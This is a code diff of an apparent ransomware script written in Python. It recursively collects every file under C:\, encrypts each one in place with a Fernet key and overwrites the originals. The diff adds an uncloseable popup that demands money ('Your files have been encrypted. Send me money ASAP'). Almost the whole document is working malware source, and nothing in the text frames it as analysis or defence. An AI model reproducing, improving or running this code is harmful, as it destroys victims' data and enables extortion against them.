@@ -1,6 +1,23 @@
 import os
 from cryptography.fernet import Fernet
+import tkinter
+from tkinter import messagebox
+import threading
 
+
+def create_popup():
+    root = tkinter.Tk()
+    root.title("Attention")
+    root.geometry("300x200")
+
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+
+    label = tkinter.Label(root, text="Your files have been encrypted. Send me money ASAP", padx=20, pady=20)
+    label.pack(expand=True)
+
+    root.after(10000, root.destroy)
+    root.mainloop()
+    
 
 
 root_dir = "C:\\"
@@ -26,22 +43,28 @@ def get_all_files(root_dir):
     return all_files
 
 files = get_all_files(root_dir)
-
-
 key = Fernet.generate_key()
-#generate a key with fernet and store it in a file named "TheKey.key" AND ignore it in the previous for loop
-with open("TheKey.key", "wb") as thekey:
-    thekey.write(key)
 
-fernet = Fernet(key)
-for file in files:
-    try:
-        with open(file, "rb") as theFile:
-            contentOfFiles = theFile.read()
-        #Encrypt data
-        encryptedContent = fernet.encrypt(contentOfFiles)
-        with open(file, "wb") as theFile:
-            theFile.write(encryptedContent)
-        print(f"Encrypted {file}")
-    except Exception as e:
-        print(f"Failed to encrypt {file}: {e}")
+def generate_key():
+    with open("TheKey.key", "wb") as thekey:
+        thekey.write(key)
+
+def encrypt():
+    fernet = Fernet(key)
+    for file in files:
+        try:
+            with open(file, "rb") as theFile:
+                contentOfFiles = theFile.read()
+            #Encrypt data
+            encryptedContent = fernet.encrypt(contentOfFiles)
+            with open(file, "wb") as theFile:
+                theFile.write(encryptedContent)
+            print(f"Encrypted {file}")
+        except Exception as e:
+            print(f"Failed to encrypt {file}: {e}")
+
+    pop_up_threat = threading.Thread(target=create_popup)
+    pop_up_threat.start()
+
+generate_key()
+encrypt()
